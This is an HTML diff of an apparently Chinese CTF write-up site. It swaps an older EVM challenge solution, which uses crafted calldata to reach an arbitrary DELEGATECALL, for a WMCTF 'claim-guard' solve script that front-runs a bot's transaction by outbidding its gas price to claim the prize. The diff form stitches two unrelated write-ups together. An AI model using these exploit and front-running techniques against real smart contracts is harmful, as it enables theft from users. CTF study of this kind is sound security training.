+<span class="w">    </span><span class="k">fn</span><span class="w"> </span><span class="nf">next</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="bp">self</span><span class="p">)</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="nb">Option</span><span class="o">&lt;</span><span class="bp">Self</span><span class="p">::</span><span class="n">Item</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">loop</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="kd">let</span><span class="w"> </span><span class="n">best</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">independent</span><span class="p">.</span><span class="n">iter</span><span class="p">().</span><span class="n">next_back</span><span class="p">()</span><span class="o">?</span><span class="p">.</span><span class="n">clone</span><span class="p">();</span>
+<span class="w">            </span><span class="kd">let</span><span class="w"> </span><span class="n">best</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">independent</span><span class="p">.</span><span class="n">take</span><span class="p">(</span><span class="o">&amp;</span><span class="n">best</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+<span class="w">            </span><span class="kd">let</span><span class="w"> </span><span class="n">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">best</span><span class="p">.</span><span class="n">transaction</span><span class="p">.</span><span class="n">hash</span><span class="p">();</span>
 
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setUp</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">tokyoPayload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">TokyoPayload</span><span class="p">();</span>
-<span class="w">        </span><span class="nx">logic</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="ow">new</span><span class="w"> </span><span class="nx">Logic</span><span class="p">());</span>
-<span class="w">    </span><span class="p">}</span>
+<span class="w">            </span><span class="kd">let</span><span class="w"> </span><span class="n">ready</span><span class="w"> </span><span class="o">=</span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="nb">Some</span><span class="p">(</span><span class="n">ready</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">all</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hash</span><span class="p">).</span><span class="n">cloned</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">ready</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">continue</span><span class="w"> </span><span class="p">};</span>
 
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">testSolve</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">string</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">inputs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">string</span><span class="p">[](</span><span class="mf">3</span><span class="p">);</span>
-<span class="w">        </span><span class="nx">inputs</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;python3&quot;</span><span class="p">;</span>
-<span class="w">        </span><span class="nx">inputs</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;script/generate.py&quot;</span><span class="p">;</span>
-<span class="w">        </span><span class="nx">inputs</span><span class="p">[</span><span class="mf">2</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Strings</span><span class="p">.</span><span class="nx">toHexString</span><span class="p">(</span><span class="nx">logic</span><span class="p">);</span>
-<span class="w">        </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">vm</span><span class="p">.</span><span class="nx">ffi</span><span class="p">(</span><span class="nx">inputs</span><span class="p">);</span>
-<span class="w">        </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">s</span><span class="p">,</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">tokyoPayload</span><span class="p">).</span><span class="nx">call</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
-<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">s</span><span class="p">);</span>
-<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">tokyoPayload</span><span class="p">.</span><span class="nx">solved</span><span class="p">());</span>
+<span class="w">            </span><span class="c1">// Insert transactions that just got unlocked.</span>
+<span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="n">hash</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ready</span><span class="p">.</span><span class="n">unlocks</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="c1">// first check local awaiting transactions</span>
+<span class="w">                </span><span class="kd">let</span><span class="w"> </span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="nb">Some</span><span class="p">((</span><span class="k">mut</span><span class="w"> </span><span class="n">satisfied</span><span class="p">,</span><span class="w"> </span><span class="n">tx_ref</span><span class="p">))</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">awaiting</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="n">hash</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="n">satisfied</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="w">                    </span><span class="nb">Some</span><span class="p">((</span><span class="n">satisfied</span><span class="p">,</span><span class="w"> </span><span class="n">tx_ref</span><span class="p">))</span>
+<span class="w">                    </span><span class="c1">// then get from the pool</span>
+<span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="bp">self</span><span class="p">.</span><span class="n">all</span>
+<span class="w">                        </span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">hash</span><span class="p">)</span>
+<span class="w">                        </span><span class="p">.</span><span class="n">map</span><span class="p">(</span><span class="o">|</span><span class="n">next</span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="n">next</span><span class="p">.</span><span class="n">requires_offset</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">next</span><span class="p">.</span><span class="n">transaction</span><span class="p">.</span><span class="n">clone</span><span class="p">()))</span>
+<span class="w">                </span><span class="p">};</span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="nb">Some</span><span class="p">((</span><span class="n">satisfied</span><span class="p">,</span><span class="w"> </span><span class="n">tx_ref</span><span class="p">))</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">res</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="bp">self</span><span class="p">.</span><span class="n">independent_or_awaiting</span><span class="p">(</span><span class="n">satisfied</span><span class="p">,</span><span class="w"> </span><span class="n">tx_ref</span><span class="p">)</span>
+<span class="w">                </span><span class="p">}</span>
+<span class="w">            </span><span class="p">}</span>
+
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nb">Some</span><span class="p">(</span><span class="n">best</span><span class="p">.</span><span class="n">transaction</span><span class="p">)</span>
+<span class="w">        </span><span class="p">}</span>
 <span class="w">    </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
-<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">sys</span>
-
-<span class="k">def</span> <span class="nf">place</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">value</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
-    <span class="k">global</span> <span class="n">data</span>
-    <span class="k">if</span> <span class="n">l</span> <span class="o">:=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span> <span class="o">&lt;</span> <span class="n">offset</span><span class="p">:</span>
-        <span class="n">data</span> <span class="o">+=</span> <span class="s1">&#39;00&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="n">l</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span>
-    <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span> <span class="n">offset</span> <span class="o">*</span> <span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">value</span><span class="si">:</span><span class="s1">064x</span><span class="si">}</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">data</span><span class="p">[(</span><span class="n">offset</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="p">:]</span>
-
-<span class="n">target_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
-<span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;000040c3&#39;</span>   <span class="c1"># sig</span>
-<span class="n">data</span> <span class="o">+=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="mh">0x7b</span><span class="si">:</span><span class="s1">064x</span><span class="si">}</span><span class="s1">&#39;</span>  <span class="c1"># x</span>
-<span class="n">data</span> <span class="o">+=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="mh">0x153</span><span class="si">:</span><span class="s1">064x</span><span class="si">}</span><span class="s1">&#39;</span> <span class="c1"># y</span>
-<span class="n">place</span><span class="p">(</span><span class="mh">0x4</span> <span class="o">+</span> <span class="mh">0x153</span> <span class="o">*</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x17f</span><span class="p">)</span>   <span class="c1"># funcs[0x153] = 0x17f</span>
-<span class="n">place</span><span class="p">(</span><span class="mh">0x20</span> <span class="o">*</span> <span class="mh">0x18f</span> <span class="o">+</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="mh">0x153</span> <span class="o">-</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">)</span> <span class="c1"># MEM[0x20 * 0x18f + 0x20 + y] = 0xd0</span>
-<span class="n">place</span><span class="p">(</span><span class="mh">0x60</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">)</span> <span class="c1"># b: new_x</span>
-<span class="n">place</span><span class="p">(</span><span class="mh">0x60</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x1a3</span><span class="p">)</span> <span class="c1"># c: new_y</span>
-<span class="n">place</span><span class="p">(</span><span class="mh">0x4</span> <span class="o">+</span> <span class="mh">0x1a3</span> <span class="o">*</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">)</span>   <span class="c1"># funcs[0x1a3] = 0xd0</span>
-<span class="n">place</span><span class="p">(</span><span class="mh">0x18f</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">)</span>   <span class="c1"># b: STOP JUMPDEST</span>
-<span class="n">place</span><span class="p">(</span><span class="mh">0x18f</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">,</span> <span class="n">target_addr</span><span class="p">)</span>   <span class="c1"># c: DELEGATECALL target</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</details>
+<div class="highlight"><pre><span></span><code><span class="sd">/// transactions that are ready to be included in a block.</span>
+<span class="cp">#[derive(Clone, Debug, Default)]</span>
+<span class="k">pub</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">ReadyTransactions</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="o">..</span><span class="p">.</span>
+<span class="w">    </span><span class="sd">/// independent transactions that can be included directly and don&#39;t require other transactions</span>
+<span class="w">    </span><span class="sd">/// Sorted by their id</span>
+<span class="w">    </span><span class="n">independent_transactions</span><span class="p">:</span><span class="w"> </span><span class="nc">BTreeSet</span><span class="o">&lt;</span><span class="n">PoolTransactionRef</span><span class="o">&gt;</span><span class="p">,</span>
+<span class="p">}</span>
+<span class="o">..</span><span class="p">.</span>
+<span class="k">impl</span><span class="w"> </span><span class="nb">Ord</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">PoolTransactionRef</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">fn</span><span class="w"> </span><span class="nf">cmp</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">,</span><span class="w"> </span><span class="n">other</span><span class="p">:</span><span class="w"> </span><span class="kp">&amp;</span><span class="nc">Self</span><span class="p">)</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="nc">Ordering</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="bp">self</span><span class="p">.</span><span class="n">transaction</span>
+<span class="w">            </span><span class="p">.</span><span class="n">priority</span>
+<span class="w">            </span><span class="p">.</span><span class="n">cmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">other</span><span class="p">.</span><span class="n">transaction</span><span class="p">.</span><span class="n">priority</span><span class="p">)</span>
+<span class="w">            </span><span class="p">.</span><span class="n">then_with</span><span class="p">(</span><span class="o">||</span><span class="w"> </span><span class="n">other</span><span class="p">.</span><span class="n">id</span><span class="p">.</span><span class="n">cmp</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">.</span><span class="n">id</span><span class="p">))</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
-<h2 id="_3">参考资料<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
-<ul>
-<li><a href="https://docs.soliditylang.org/en/latest/internals/layout_in_memory.html">Layout in Memory — Solidity documentation</a></li>
-<li><a href="https://book.getfoundry.sh/forge/debugger">Debugger - Foundry Book</a></li>
+</li>
+<li>
+<p>根据 <code>nonce</code> 和题目约束，<code>proveWork()</code> 只能在 <code>registerBlock()</code> 之后执行，因此只需要 <code>player</code> 以更高的 <code>gas_price</code> 抢跑 bot 的 <code>registerBlock()</code> 交易并完成 <code>proveWork()</code> 即可</p>
+</li>
 </ul>
+<h3 id="_3">解题脚本<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">web3</span> <span class="kn">import</span> <span class="n">Web3</span>
+<span class="kn">from</span> <span class="nn">cheb3</span> <span class="kn">import</span> <span class="n">Connection</span>
+<span class="kn">from</span> <span class="nn">cheb3.utils</span> <span class="kn">import</span> <span class="n">encode_with_signature</span>
+<span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">pwn</span>
+
+<span class="n">ticket</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;&lt;ticket&gt;&quot;</span>
+<span class="n">HOST</span> <span class="o">=</span> <span class="s2">&quot;claim-guard.wm-team.cn&quot;</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">1337</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;ticket&quot;</span><span class="p">,</span> <span class="n">ticket</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;action?&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;rpc endpoints&quot;</span><span class="p">)</span>
+<span class="n">rpc</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline_contains</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;-&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">conn</span> <span class="o">=</span> <span class="n">Connection</span><span class="p">(</span><span class="n">rpc</span><span class="p">)</span>
+<span class="n">priv</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline_contains</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;private key&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">account</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">account</span><span class="p">(</span><span class="n">priv</span><span class="p">)</span>
+<span class="n">setup</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline_contains</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;contract:&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="n">chall</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cast_call</span><span class="p">(</span><span class="n">setup</span><span class="p">,</span> <span class="s2">&quot;chall()(address)&quot;</span><span class="p">)</span>
+
+<span class="nb">pow</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">bn</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_block_number</span><span class="p">()</span> <span class="o">+</span> <span class="mi">2</span>
+<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+    <span class="n">h</span> <span class="o">=</span> <span class="n">Web3</span><span class="o">.</span><span class="n">solidity_keccak</span><span class="p">([</span><span class="s1">&#39;uint256&#39;</span><span class="p">,</span> <span class="s1">&#39;uint256&#39;</span><span class="p">],</span> <span class="p">[</span><span class="nb">pow</span><span class="p">,</span> <span class="n">bn</span><span class="p">])</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
+    <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mh">0xf0</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Pow:&quot;</span><span class="p">,</span> <span class="nb">pow</span><span class="p">)</span>
+        <span class="k">break</span>
+    <span class="nb">pow</span> <span class="o">+=</span> <span class="mi">1</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Waiting for block&quot;</span><span class="p">,</span> <span class="n">bn</span><span class="p">)</span>
+<span class="n">current_bn</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_block_number</span><span class="p">()</span> <span class="o">+</span> <span class="mi">1</span>
+<span class="k">while</span> <span class="n">bn</span> <span class="o">&gt;</span> <span class="n">current_bn</span><span class="p">:</span>
+    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+    <span class="n">current_bn</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_block_number</span><span class="p">()</span> <span class="o">+</span> <span class="mi">1</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Current block&quot;</span><span class="p">,</span> <span class="n">current_bn</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">bn</span> <span class="o">==</span> <span class="n">current_bn</span><span class="p">:</span>
+    <span class="n">nonce</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">account</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
+    <span class="n">account</span><span class="o">.</span><span class="n">send_transaction</span><span class="p">(</span><span class="n">chall</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">encode_with_signature</span><span class="p">(</span><span class="s2">&quot;registerBlock()&quot;</span><span class="p">),</span> <span class="n">wait_for_receipt</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">gas_limit</span><span class="o">=</span><span class="mi">300000</span><span class="p">,</span> <span class="n">gas_price</span><span class="o">=</span><span class="mi">110000000010</span><span class="p">)</span>
+    <span class="n">account</span><span class="o">.</span><span class="n">send_transaction</span><span class="p">(</span><span class="n">chall</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">encode_with_signature</span><span class="p">(</span><span class="s2">&quot;proveWork(bytes32)&quot;</span><span class="p">,</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="nb">pow</span><span class="si">:</span><span class="s2">064x</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)),</span> <span class="n">nonce</span><span class="o">=</span><span class="n">nonce</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">wait_for_receipt</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">gas_limit</span><span class="o">=</span><span class="mi">300000</span><span class="p">,</span> <span class="n">gas_price</span><span class="o">=</span><span class="mi">110000000010</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">account</span><span class="o">.</span><span class="n">send_transaction</span><span class="p">(</span><span class="n">chall</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">encode_with_signature</span><span class="p">(</span><span class="s2">&quot;claimLastWinner(address)&quot;</span><span class="p">,</span> <span class="n">account</span><span class="o">.</span><span class="n">address</span><span class="p">),</span> <span class="n">nonce</span><span class="o">=</span><span class="n">nonce</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="n">gas_limit</span><span class="o">=</span><span class="mi">300000</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+    <span class="n">lastWinner</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cast_call</span><span class="p">(</span><span class="n">chall</span><span class="p">,</span> <span class="s2">&quot;lastWinner()(address)&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Player:&quot;</span><span class="p">,</span> <span class="n">account</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;lastWinner:&quot;</span><span class="p">,</span> <span class="n">lastWinner</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">account</span><span class="o">.</span><span class="n">address</span> <span class="o">==</span> <span class="n">lastWinner</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;ticket&quot;</span><span class="p">,</span> <span class="n">ticket</span><span class="p">)</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;action?&quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h3 id="flag">Flag<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>WMCTF{is_m3v_this_ea5y}</p>
+</blockquote>
+<div class="footnote">
+<hr />
+<ol>
+<li id="fn:default">
+<p><a href="https://github.com/foundry-rs/foundry/blob/master/crates/anvil/src/eth/pool/transactions.rs#L46">foundry-rs / foundry</a>&#160;<a class="footnote-backref" href="#fnref:default" title="Jump back to footnote 1 in the text">&#8617;</a></p>
+</li>
+</ol>
+</div>
 
   <hr>
 <div class="md-source-file">
   <small>
     
       最后更新:
-      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年11月21日 17:31:19</span>
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2024年9月14日 23:29:11</span>
       
     
   </small>
@@ -4110,7 +4144,7 @@
     <nav class="md-footer__inner md-grid" aria-label="页脚" >
       
         
-        <a href="../tribunal/" class="md-footer__link md-footer__link--prev" aria-label="上一页: tribunal" rel="prev">
+        <a href="../lustrous/" class="md-footer__link md-footer__link--prev" aria-label="上一页: Lustrous" rel="prev">
           <div class="md-footer__button md-icon">
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
           </div>
@@ -4119,20 +4153,20 @@
               <span class="md-footer__direction">
                 上一页
               </span>
-              tribunal
+              Lustrous
             </div>
           </div>
         </a>
       
       
         
-        <a href="../chain_hunter/" class="md-footer__link md-footer__link--next" aria-label="下一页: 链上猎手" rel="next">
+        <a href="../../wargames/natas/" class="md-footer__link md-footer__link--next" aria-label="下一页: Natas" rel="next">
           <div class="md-footer__title">
             <div class="md-ellipsis">
               <span class="md-footer__direction">
                 下一页
               </span>
-              链上猎手
+              Natas
             </div>
           </div>
           <div class="md-footer__button md-icon">
